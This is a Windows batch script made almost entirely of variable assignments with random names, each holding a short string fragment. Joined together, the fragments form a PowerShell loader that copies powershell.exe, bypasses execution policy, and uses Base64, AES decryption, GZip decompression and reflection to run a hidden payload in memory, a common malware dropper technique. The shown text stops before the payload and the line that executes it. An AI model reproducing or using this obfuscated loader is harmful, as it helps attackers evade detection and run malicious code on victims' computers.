@echo off
set "LiEfgcDbgK=he"
set "oUWaixcvIY=Wi"
set "TxOriMiGow=rs"
set "meJbaDgYUE=Sy"
set "iwuExXyVTt= /"
set "wVwdvfqCMy=s\"
set "MnYSObQvIg=xe"
set "unnDcjolAK=\W"
set "dWZTyPpVvQ=ll"
set "fVzgnsSgzw=in"
set "giFcycMNZv=ll"
set "QgTJlXGJBt=ws"
set "dmHlCKZudG=st"
set "xnkyFiPKWq=y "
set "ixpNnmDAtA=we"
set "CoOWTZcQUp=rS"
set "rhHUfhdggO=he"
set "oVFzVbJIKJ=py"
set "rRprQaTfMs=\v"
set "RisWYPAzpl=.e"
set "wUEeJXjoYH=1."
set "ZrndpDWVcQ=co"
set "KEHxjSHZxE=do"
set "mpRyYUTnpf=po"
set "pHbFrzLzuv=Po"
set "gNufJQGPtj=we"
set "zqGLBLNsga=nd"
set "ZnDVWpAsaA= C"
set "vkFHNYUTBt=32"
set "TMJwqQFNlG=:\"
set "mEIJcuJLxR=0\"
set "dDUBXBliif=ow"
set "lUmDCETCqw=em"
set "OjBkyhJbkl= %~dp0"
set "vUQcOolTbY=cd"
set "ntuxkllfNS=vert"
set "EHDRWUcOBy=m.IO"
set "KyGUuyixlL=106u"
set "fSSQDFyMLj=]::C"
set "hFoNXujSzu=se()"
set "QZzngKLmer=tS46"
set "OyXBnfhhnv=1] -"
set "wLwpElkePm== $P"
set "kgFJbHTOPh= = ["
set "hJxKZUNhYC=sp.I"
set "SqpXqzTmUB=pher"
set "NSmFYFnWsL=PKCS"
set "JnxOtrZvLZ=Bj);"
set "iJDnoxTLuW=..-1"
set "cXDiKUuQHi=stem"
set "fjkzQUennA=-joi"
set "MiVIRTedME=.Len"
set "PbzOkLWIyw='[-1"
set "ywKvZXLmPt=Stre"
set "dXPPOfShtr=ay()"
set "TBHMeWjZWh=Invo"
set "wrogFcfSpS=hy.A"
set "mpzswwzhph=lit("
set "nvVtKICjPA=.Sec"
set "eZfabeCItn=Disp"
set "gYmrgQZsjC=ypto"
set "ojEuVoVvPu=Bmor"
set "lIwtiADSIZ=$TAj"
set "LOJbNUVUpZ=[]] "
set "TvzcwZZqyh=);$P"
set "KgMTtUMBDz=rt]:"
set "iGUUCyfZDU=3); "
set "jezJnqSeLt=);$P"
set "NNScwQOCDR=:: '"
set "GIFLPHgCVe=6esa"
set "CSZzPbqRPa=.Cop"
set "wJxTstoftw=-joi"
set "XuspZkKNfI=ptog"
set "YSDtvdVmaA=-ep "
set "CaXJCZFvgS=.Cre"
set "tYrlanhdyN=New-"
set "mrVTgFInhi=$hSQ"
set "eHAqRhaZNt=yTo("
set "AsgJaflvqU=null"
set "lSjKtlcPDb=[Env"
set "LlmzRYTKUs=ach "
set "bnykBewblB=flec"
set "PXFJKMOkLQ=.GZi"
set "vnZTKUbWnf=musp"
set "DsELNzOGFZ=.Key"
set "rCJUDnoeBl=;$Sd"
set "uTxEeothUI=)($T"
